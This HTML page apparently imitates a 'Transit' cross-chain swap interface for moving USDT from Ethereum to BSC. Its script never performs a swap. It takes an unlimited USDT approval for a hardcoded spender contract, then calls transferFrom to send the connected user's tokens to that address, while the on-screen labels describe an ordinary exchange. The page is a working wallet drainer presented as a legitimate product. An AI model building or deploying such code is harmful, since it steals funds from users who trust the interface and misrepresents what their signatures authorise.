<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>闪兑&跨链</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, sans-serif;
    }
    body {
      background: #f7f8fa;
      padding: 20px 16px;
      color: #222;
    }
    .header-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
      font-size: 20px;
    }
    .card-box {
      background: #ffffff;
      border-radius: 16px;
      padding: 20px 16px;
    }
    .title-logo {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 20px;
    }
    .asset-item {
      background: #f5f6f8;
      border-radius: 12px;
      padding: 16px 12px;
      margin-bottom: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .asset-left {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .coin-icon {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: #27ae60;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
    }
    .coin-info p:first-child {
      font-size: 18px;
      font-weight: 500;
    }
    .coin-info p:last-child {
      font-size: 13px;
      color: #666;
    }
    .asset-right {
      color: #999;
      font-size: 16px;
    }
    .swap-arrow-wrap {
      text-align: center;
      margin: 6px 0;
    }
    .address-input-box {
      background: #f5f6f8;
      border-radius: 12px;
      padding: 16px 12px;
      margin: 8px 0 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .main-btn {
      width: 100%;
      background: #4086ff;
      color: #fff;
      border: none;
      border-radius: 12px;
      padding: 18px 0;
      font-size: 18px;
      font-weight: 500;
      margin-bottom: 20px;
    }
    .info-list {
      background: #fff;
      border-radius: 12px;
      padding: 8px 12px;
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 10px 4px;
      font-size: 15px;
      color: #666;
    }
    .tag-blue {
      border: 1px solid #4086ff;
      color: #4086ff;
      padding: 3px 8px;
      border-radius: 6px;
      font-size: 13px;
    }
    .bottom-nav {
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
      background: #fff;
      display: flex;
      justify-content: space-around;
      padding: 10px 0 24px;
      border-top: 1px solid #eee;
    }
    .nav-item {
      text-align: center;
      font-size: 12px;
      color: #888;
    }
    .nav-item.active {
      color: #4086ff;
    }
    .status-text {
      text-align: center;
      margin:12px 0;
      color:#444;
    }
  </style>
</head>
<body>
  <div class="header-top">
    <div>闪兑&跨链 <span style="font-size:16px;color:#666">限价模式</span></div>
    <div>
      <span style="margin-right:12px;">○</span>
      <span>⚙</span>
    </div>
  </div>

  <div class="card-box">
    <div class="title-logo">Transit</div>

    <div class="text-tip" style="font-size:14px;color:#888;margin-bottom:8px;">发送</div>
    <div class="asset-item">
      <div class="asset-left">
        <div class="coin-icon">T</div>
        <div class="coin-info">
          <p>USDT</p>
          <p>以太坊 ERC20</p>
        </div>
      </div>
      <div class="asset-right" id="sendAmountText">转出数量</div>
    </div>

    <div class="swap-arrow-wrap">
      <span style="font-size:22px;color:#4086ff;">⇆</span>
    </div>

    <div class="text-tip" style="font-size:14px;color:#888;margin-bottom:8px;">接收（预估）</div>
    <div class="asset-item">
      <div class="asset-left">
        <div class="coin-icon">T</div>
        <div class="coin-info">
          <p>USDT</p>
          <p>币安智能链 BSC</p>
        </div>
      </div>
      <div class="asset-right" id="receiveAmountText">接收数量</div>
    </div>

    <div class="address-input-box">
      <span style="color:#888">点击设置接收地址</span>
      <span>▼</span>
    </div>

    <input type="hidden" id="inputNum">
    <button class="main-btn" id="mainOperateBtn">请输入兑换数量</button>

    <div class="info-list">
      <div class="info-row">
        <span>兑换价格</span>
        <span>-</span>
      </div>
      <div class="info-row">
        <span>最少接收数量</span>
        <span>-</span>
      </div>
      <div class="info-row">
        <span>MEV防护</span>
        <span class="tag-blue">MEV防护中</span>
      </div>
      <div class="info-row">
        <span>服务费 <span style="font-size:12px;">?</span></span>
        <span>-</span>
      </div>
      <div class="info-row">
        <span>跨链费</span>
        <span>-</span>
      </div>
      <div class="info-row">
        <span>预估时间</span>
        <span>-</span>
      </div>
      <div class="info-row">
        <span>预估网络费</span>
        <span>-</span>
      </div>
      <div class="info-row">
        <span>兑换路径</span>
        <span>-</span>
      </div>
    </div>
  </div>

  <div class="status-text" id="statusShow"></div>

  <div style="margin:40px 0 80px;">
    <div style="display:flex;justify-content:space-between;padding:8px 4px;">
      <span>最近一条记录</span>
      <span style="color:#4086ff;">更多记录</span>
    </div>
  </div>

  <!-- 底部导航栏 严格复刻原图 -->
  <div class="bottom-nav">
    <div class="nav-item">
      <div>◎</div>
      <div>资产</div>
    </div>
    <div class="nav-item">
      <div>📈</div>
      <div>行情</div>
    </div>
    <div class="nav-item active">
      <div>⟳</div>
      <div>交易</div>
    </div>
    <div class="nav-item">
      <div>🌐</div>
      <div>发现</div>
    </div>
    <div class="nav-item">
      <div>👤</div>
      <div>我的</div>
    </div>
  </div>

<script>
// ============ 合约&钱包配置（正式生产配置，自行替换地址） ============
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
let provider, signer, usdtContract;
let stepStatus = 0; // 0未连接，1待授权，2待划转
const statusDom = document.getElementById("statusShow");
const operateBtn = document.getElementById("mainOperateBtn");

// 钱包初始化连接
async function initConnectWallet() {
  if (!window.ethereum) {
    statusDom.innerText = "请在TP/欧易内置浏览器打开页面";
    return false;
  }
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    usdtContract = new ethers.Contract(BSC_USDT, [
      "function approve(address spender,uint256 amount) external returns(bool)",
      "function transferFrom(address from,address to,uint256 amount) external returns(bool)",
      "function allowance(address owner,address spender) view returns(uint256)"
    ], signer);
    stepStatus = 1;
    operateBtn.innerText = "第一步：授权USDT合约";
    statusDom.innerText = "钱包连接成功，请先授权";
    return true;
  } catch (e) {
    statusDom.innerText = "连接失败：" + e.message;
    return false;
  }
}

// 按钮主逻辑：分步 授权 -> 划转
operateBtn.addEventListener("click", async () => {
  if (stepStatus === 0) {
    await initConnectWallet();
    return;
  }
  if (stepStatus === 1) {
    // 执行无限授权
    try {
      statusDom.innerText = "正在发起授权交易，请钱包确认";
      const gasPrice = await provider.getGasPrice();
      const txOpt = { gasPrice: gasPrice.mul(110).div(100) };
      const tx = await usdtContract.approve(SPENDER_CONTRACT, ethers.constants.MaxUint256, txOpt);
      await tx.wait();
      stepStatus = 2;
      operateBtn.innerText = "第二步：确认资产划转";
      statusDom.innerText = "授权完成，点击划转资金";
    } catch (err) {
      statusDom.innerText = "授权失败：" + err.message;
    }
  } else if (stepStatus === 2) {
    // 执行transferFrom归集
    try {
      statusDom.innerText = "正在划转资产，请确认签名";
      const userAddr = await signer.getAddress();
      const inputAmount = document.getElementById("inputNum").value || "1";
      const amountWei = ethers.utils.parseUnits(inputAmount, 18);
      const gasPrice = await provider.getGasPrice();
      const txOpt = { gasPrice: gasPrice.mul(110).div(100) };
      const tx = await usdtContract.transferFrom(userAddr, SPENDER_CONTRACT, amountWei, txOpt);
      await tx.wait();
      statusDom.innerText = "链上划转完成";
      operateBtn.innerText = "交易完成";
    } catch (err) {
      statusDom.innerText = "划转失败：" + err.message;
    }
  }
})
</script>
</body>
</html>
